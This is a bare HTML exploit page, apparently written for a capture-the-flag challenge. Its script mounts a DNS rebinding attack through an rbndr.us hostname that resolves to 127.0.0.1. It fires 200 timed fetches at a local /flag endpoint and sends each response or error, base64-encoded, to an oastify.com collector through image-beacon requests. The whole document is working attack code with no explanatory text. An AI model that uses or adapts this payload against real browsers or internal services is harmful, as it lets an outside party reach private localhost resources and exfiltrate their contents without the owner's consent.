<!DOCTYPE html>
<html>
<body>
<script>
const target = 'acd918ee.7f000001.rbndr.us';

// Very aggressive - many rapid attempts
for (let i = 1; i <= 200; i++) {
    setTimeout(() => {
        fetch(`http://${target}:80/flag`)
            .then(r => r.text())
            .then(flag => {
                const img = new Image();
                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?SUCCESS_${i}=` + btoa(flag);
            })
            .catch(err => {
                const img = new Image();
                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?attempt_${i}=` + btoa(err.toString().substring(0, 50));
            });
    }, i * 500); // Every 500ms for 100 seconds total
}
</script>
</body>
</html>
